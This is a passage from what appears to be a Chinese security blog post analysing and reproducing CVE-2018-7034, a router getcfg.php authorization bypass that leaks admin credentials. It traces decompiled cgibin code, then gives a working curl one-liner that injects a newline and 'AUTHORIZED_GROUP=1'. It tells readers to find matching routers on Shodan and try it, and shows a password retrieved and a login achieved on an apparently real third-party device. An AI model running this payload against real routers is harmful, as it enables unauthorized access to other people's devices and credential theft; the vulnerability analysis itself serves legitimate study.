<p>下面我们直接跳过 <code>for ( i = a3; *i; ++i )</code> 来看结果<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/11.png"></p>
<p>从上面这张图中我们可以看到参数是以键值对的形式存储并且以换行符 <code>\n</code> 分割</p>
<p>所以我们构造并传入一个 <code>AUTHORIZED_GROUP=1</code> 这样就可以在给 <code>AUTHORIZED_GROUP</code> 赋值的顶替掉程序原本想要赋值的值使用我们给的数据 <code>1</code> </p>
<p>下面我们来看 <code>33行-48行</code><br><code>v9</code> 获取了 <code>REQUEST_METHOD</code> 的值<br>随后判断是否使用 <code>HEAD</code> 或 <code>GET</code> 类型传参，如果是，则将 <code>sub_405CF8</code> 函数地址赋值给 <code>v11</code><br>如果使用的是 <code>POST</code>  传参那么就会将 <code>sub_405AC0</code> 函数地址赋值给 <code>v11</code><br>而显然我们使用的是 <code>POST</code> 传参方式，也就是说我们的 <code>v11</code> 是 <code>sub_405AC0</code> 函数地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  v9 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  v10 = v9;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v9, <span class="string">&quot;HEAD&quot;</span>) || !strcasecmp(v10, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = sub_405CF8;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v10, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_20:</span><br><span class="line">    v5 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = sub_405AC0;</span><br></pre></td></tr></table></figure>

<p>下面会进入到 <code>cgibin_parse_request</code> 函数中<br>这里获取了 <code>CONTENT_TYPE</code> 和 <code>CONTENT_LENGTH</code> 两个环境变量，所以我们的 <code>start.sh</code> 脚本中也需要设置对应的 <code>-E CONTENT_TYPE</code> 和 <code>-E CONTENT_LENGTH</code> 这里需要注意 <code>CONTENT_LENGTH</code> 得和我们输入的长度一致，否则可能发生错误<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/12.png"></p>
<p>再进入到 <code>parse_uri</code> ，可以看到开头获取了 <code>REQUEST_URI</code> 如果我们的 <code>start.sh</code> 脚本中没有设置 <code>-E REQUEST_URL</code><br>那么后续就会导致获取失败，从而导致程序异常退出<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/13.png"></p>
<p>继续往下看，我们将已知的变量修改一下名字，可以看到下面有一个 <code>strncasecmp</code> 要求让 <code>content_type</code> 和 <code>v14</code> 的相同才可以进入其中，否则则会执行 <code>return -1</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/14.png"></p>
<p>我们在 <code>strncasecmp</code> 处下断点看到这里的 <code>v14</code> 是 <code>application/</code><br>我们设置 <code>application/</code> 可以顺利通过这个判断，进入到下面的 <code>return</code> 部分<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/15.png"></p>
<p>通过调试我们可以知道这里函数调用的地址实际上就是 <code>0x40445c</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/16.png"></p>
<p>我们继续来看 <code>sub_40445c</code><br>这里又有一个判断 <code>a4</code> 是之前传入的 <code>&amp;content_type[v12]</code><br>到了这里实际上就是 <code>application/</code> 后面的部分，所以我们完整的 <code>CONTENT_TYPE</code> 需要设置为 <code>application/x-www-form-urlencoded</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/17.png"></p>
<p>继续跟进到 <code>sub_403A0C</code> 函数中，发现其中有一个 <code>read</code> 函数<br>之后我们 <code>POST</code> 的请求就是使用这个 <code>read</code> 来读入的<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/18.png"></p>
<p>再继续进入到 <code>sub_403864</code> 函数,此函数的作用如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_403864</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// $s1 - 字符遍历索引</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0 - 临时变量</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1 - 临时变量</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v9)(<span class="type">int</span>, _DWORD *); <span class="comment">// $t9 - 回调函数指针</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0 - 回调函数参数</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0 - 函数返回值</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v1 - 当前字符值</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $a1 - 解码前字符</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $a0 - 存储对象指针</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// $a1 - 当前字符指针</span></span><br><span class="line">  _DWORD v16[<span class="number">4</span>]; <span class="comment">// [sp+18h] [-10h] BYREF - 回调参数数组</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第一部分：解析键值对数据</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 )  <span class="comment">// 检查数据指针是否有效</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>; <span class="comment">// 初始化遍历索引</span></span><br><span class="line">    <span class="keyword">if</span> ( a3 ) <span class="comment">// 检查数据长度</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 循环终止条件：遍历完成</span></span><br><span class="line">        result = v6 &lt; a3;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt;= a3 )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        </span><br><span class="line">        v15 = (a2 + v6);  <span class="comment">// 当前字符地址</span></span><br><span class="line">        v12 = *(a2 + v6); <span class="comment">// 获取当前字符值</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 状态机：0=解析键(key), 1=解析值(value)</span></span><br><span class="line">        <span class="keyword">if</span> ( *a1 ) <span class="comment">// 当前状态：解析值(value)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *v15; <span class="comment">// 取字符原始值</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 分隔符检测：&amp; 符号（键值对分隔符）</span></span><br><span class="line">          <span class="keyword">if</span> ( v12 == <span class="number">38</span> ) <span class="comment">// 38 是 &#x27;&amp;&#x27; 的 ASCII 值</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">// 递归调用自身处理当前键值对</span></span><br><span class="line">            sub_403864(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15; <span class="comment">// 跳过字符处理</span></span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 将字符添加到值缓冲区</span></span><br><span class="line">          v14 = a1[<span class="number">2</span>]; <span class="comment">// 获取值缓冲区对象指针</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">// 当前状态：解析键(key)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *v15; <span class="comment">// 取字符原始值</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 分隔符检测：= 符号（键值分隔符）</span></span><br><span class="line">          <span class="keyword">if</span> ( v12 == <span class="number">61</span> ) <span class="comment">// 61 是 &#x27;=&#x27; 的 ASCII 值</span></span><br><span class="line">          &#123;</span><br><span class="line">            *a1 = <span class="number">1</span>; <span class="comment">// 切换状态到值解析</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_15; <span class="comment">// 跳过字符处理</span></span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 将字符添加到键缓冲区</span></span><br><span class="line">          v14 = a1[<span class="number">1</span>]; <span class="comment">// 获取键缓冲区对象指针</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 核心操作：将当前字符添加到缓冲区</span></span><br><span class="line">        sobj_add_char(v14, v13); <span class="comment">// 字符串缓冲区追加字符</span></span><br><span class="line">        </span><br><span class="line">        LABEL_15:</span><br><span class="line">        ++v6; <span class="comment">// 移动到下一个字符</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 第二部分：键值对处理回调</span></span><br><span class="line">  <span class="keyword">if</span> ( *a1 ) <span class="comment">// 检查状态是否处于值解析中</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 检查键缓冲区是否有数据</span></span><br><span class="line">    <span class="keyword">if</span> ( !sobj_empty(a1[<span class="number">1</span>]) ) </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// URI解码：对键和值进行解码处理</span></span><br><span class="line">      sobj_unescape_uri(a1[<span class="number">1</span>]); <span class="comment">// 解码键</span></span><br><span class="line">      sobj_unescape_uri(a1[<span class="number">2</span>]); <span class="comment">// 解码值</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 准备回调函数参数</span></span><br><span class="line">      v7 = a1[<span class="number">1</span>]; <span class="comment">// 键字符串指针</span></span><br><span class="line">      v8 = a1[<span class="number">2</span>]; <span class="comment">// 值字符串指针</span></span><br><span class="line">      v9 = a1[<span class="number">3</span>]; <span class="comment">// 回调函数指针</span></span><br><span class="line">      v10 = a1[<span class="number">4</span>]; <span class="comment">// 用户上下文数据</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 构建回调参数数组</span></span><br><span class="line">      v16[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 保留位/标志位</span></span><br><span class="line">      v16[<span class="number">1</span>] = v7; <span class="comment">// 键</span></span><br><span class="line">      v16[<span class="number">2</span>] = v8; <span class="comment">// 值</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 执行回调：处理解析出的键值对</span></span><br><span class="line">      v9(v10, v16); <span class="comment">// 调用函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 第三部分：资源清理</span></span><br><span class="line">  sobj_free(a1[<span class="number">1</span>]);       <span class="comment">// 释放键缓冲区</span></span><br><span class="line">  result = sobj_free(a1[<span class="number">2</span>]); <span class="comment">// 释放值缓冲区</span></span><br><span class="line">  *a1 = <span class="number">0</span>;                <span class="comment">// 重置解析状态</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result; <span class="comment">// 返回处理结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试后我们知道我们会进入到 <code>else分支</code> 然后会执行 <code>v9(v10, v16);</code> 由 <code>gdb</code> 调试可以知道，它是跳转到 <code>0x405ac0</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/19.png"></p>
<p>那么我们进入到 <code>sub_405AC0</code> 函数<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/20.png"></p>
<p>重点在于我们的 <code>else分支</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sobj_add_string(a1, <span class="string">&quot;_POST_&quot;</span>);</span><br><span class="line">  v5 = sobj_get_string(a2[<span class="number">1</span>]);</span><br><span class="line">  sobj_add_string(a1, v5);</span><br><span class="line">  sobj_add_char(a1, <span class="number">61</span>);</span><br><span class="line">  v6 = a2[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/21.png"></p>
<p>这里会按照 <code>POST</code> 请求对输入的内容进行解析，就是找到一个 <code>=</code> 再将前后分离并且拼接，然后将解析好的内容拼接到上面的字符串</p>
<p>随后我们回到 <code>phpcgi_main</code><br>下面会有一个 <code>sess_validate()</code> 函数<br>按照下面路径我们会发现程序会打开一个 <code>&quot;/var/session/sesscfg&quot;</code> 文件，而我们模拟的是没有的，我们只能将它 <code>patch</code> 掉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sess_validate -&gt; sub_409504 -&gt; sub_4090B0</span><br></pre></td></tr></table></figure>

<p>也就是把 <code>phpcgi_main</code> 中 <code>v13 = sess_validate();</code> 这一行代码去掉<br>同时为了模拟真实情况，我们手动补上 <code>li $v0，-1</code> 使得原先的 <code>v12</code> 最后为 <code>-1</code></p>
<p>按照下方式修改<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/22.png"><br>修改后如下<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/23.png"></p>
<p><code>patch</code> 之后我们使用保存修改并导出，然后替换掉我们 <code>squashfs-root</code> 文件夹中原本的 <code>cgibin</code><br>我们继续开始调试最后一步查看我们的 <code>AUTHORIZED_GROUP</code> 最后是什么</p>
<p>我们运行到 <code>sprintf(v15, &quot;AUTHORIZED_GROUP=%d&quot;, -1);</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/24.png"><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/25.png"></p>
<p>执行之后</p>
<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/26.png"><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/27.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;_POST_SERVICES=DEVICE.ACCOUNT\n_POST_attack=ture\nAUTHORIZED_GROUP=1\n\nAUTHORIZED_GROUP=-1&quot;</span></span><br></pre></td></tr></table></figure>

<p>也就是说程序原本打算写入的是 <code>AUTHORIZED_GROUP=-1</code>，但是由于前面我们已经插入了一个<code>AUTHORIZED_GROUP=1</code> 以此被我们截胡了，让 <code>AUTHORIZED_GROUP</code> 变成了 <code>1</code> 由此绕过了检测</p>
<h3 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a><strong>漏洞利用演示</strong></h3><p>前面叽里呱啦讲一堆都不重要，其实不论有没有看懂都不影响我们使用<br>我们只需要使用下面这条指令就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://[ip:port]/getcfg.php&quot;</span></span><br></pre></td></tr></table></figure>


<p>在 <code>shodon</code> 找个同型号的路由器试一试<br><a target="_blank" rel="noopener" href="https://www.shodan.io/search?query=tew-751dr">tew-751dr - Shodan Search</a></p>
<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/28.png"></p>
<p>在浏览器访问 <code>ip:port</code><br>访问成功会出现下面界面<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/29.png"></p>
<p>我们直接使用上面给出的指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://[ip:port]/getcfg.php&quot;</span></span><br></pre></td></tr></table></figure>

<p>由此我们可以获得密码<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/30.png"></p>
<p>然后就可以成功登入了<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/31.png"></p>
<p>到此为止算是复现完成了</p>
<p>参考:<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6057">Dlink getcfg.php远程敏感信息读取漏洞分析-先知社区</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/GKD2019/article/details/146465026">D-Link 登录信息泄露（越权）CVE-2018-7034 漏洞分析_trendnet路由器getcfg.php-信息泄露漏洞(cve-2018-7034)-CSDN博客</a><br><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/384#d-link-%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">XiDP</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/">http://example.com/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">XiDP</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a><a class="post-meta__tags" href="/tags/IOT/">IOT</a><a class="post-meta__tags" href="/tags/CVE/">CVE</a></div><div class="post-share"><div class="social-share" data-image="/img/Qhead.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/13/2025%20XYCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 XYCTF Pwn-wp(含附件)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">2025 XYCTF Pwn-wp(含附件)</div></div><div class="info-2"><div class="info-item-1">前言总体来说Pwn方向题目难度属于中等,属于那种一眼看不出要咋做,但多试试又能做出来的那种,比赛的时候甚至有几只队伍AK了Pwn方向。感觉题目还是很不错的尽管比赛中有一些小意外像是有些题目附件给错了，但是XYCTF的师傅们都是无偿出题纯热爱向大伙分享自己的题目和知识，感谢所有XYCTF出题的师傅，明年我还来打(〃&#39;▽&#39;〃) 通过网盘分享的文件：2025XYCTF.rar链接: https://pan.baidu.com/s/1yf7piV-H4U2qtXiQyo9eBw?pwd=xidp 提取码: xidp其中含有pwn方向全部赛题、官方wp、奶龙出题人提供的奶龙wp以及ddw队伍的师傅分享在群里的pwn方向全解wp Ret2libc’s...</div></div></div></a><a class="pagination-related" href="/2025/06/13/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="ret2gets的原理与利用方法"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ret2gets的原理与利用方法</div></div><div class="info-2"><div class="info-item-1">前言​​ret2gets是一种利用glibc优化特性（高版本编译器）的漏洞利用技术，核心是通过gets函数配合printf&#x2F;puts实现libc地址泄露。该技术适用于:  存在栈溢出漏洞 程序包含gets函数 ​​缺乏直接控制rdi寄存器的gadget​​（如pop rdi; ret）   技术原型参考: ret2gets | pwn-notes  ret2gets | pwn-notes演示程序: ret2gets_demo https://pan.baidu.com/s/1rf8JEi1sGBZdM-MxpnjMTg?pwd=xidp 提取码: xidp  程序中 pop rdi; ret 的来源12345678// gcc demo.c -o demo -no-pie -fno-stack-protector#include &lt;stdio.h&gt;int main() &#123;	char buf[0x20];	puts(&quot;ROP me if you can!&quot;);	gets(buf);&#125;  我们正常会采用的方法很简单就是...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info 